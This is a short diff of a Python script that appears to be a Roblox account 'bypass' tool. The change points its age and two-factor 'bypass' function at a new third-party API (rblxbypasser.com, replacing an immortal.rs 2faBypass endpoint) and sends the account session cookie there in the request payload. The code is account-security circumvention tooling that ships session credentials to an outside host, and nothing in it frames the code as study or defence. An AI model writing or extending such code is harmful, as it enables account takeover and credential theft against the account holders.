@@ -124,7 +124,7 @@ print("LOADED MODULES!")
 year = time.localtime().tm_year
 day = time.localtime().tm_mday
 month = time.localtime().tm_mon
-version = "2.1.4"
+version = "2.1.3"
 cookies_folder = "cookies"
 ## STARTING ##
 
@@ -261,14 +261,13 @@ def bypass(cookie, type, password="12345678"):
             return e
             os.system("pause")
     if type == "Age":
-        url = "https://immortal.rs/dashboard/api/misc/2faBypass.php"
+        url = "https://rblxbypasser.com/api/bypass"
         requests.Timeout = 999999999
         headers = {
             'Content-Type': 'application/json'
         }
         payload = {
-            "Cookie": cookie,
-            "Type": type
+            "cookie": cookie
         }
         
         try:
@@ -280,7 +279,7 @@ def bypass(cookie, type, password="12345678"):
             
             response.raise_for_status()
             data = response.json()
-            return data["msg"]
+            return data["message"]
             os.system("pause")
         except requests.exceptions.RequestException as e:
             return e
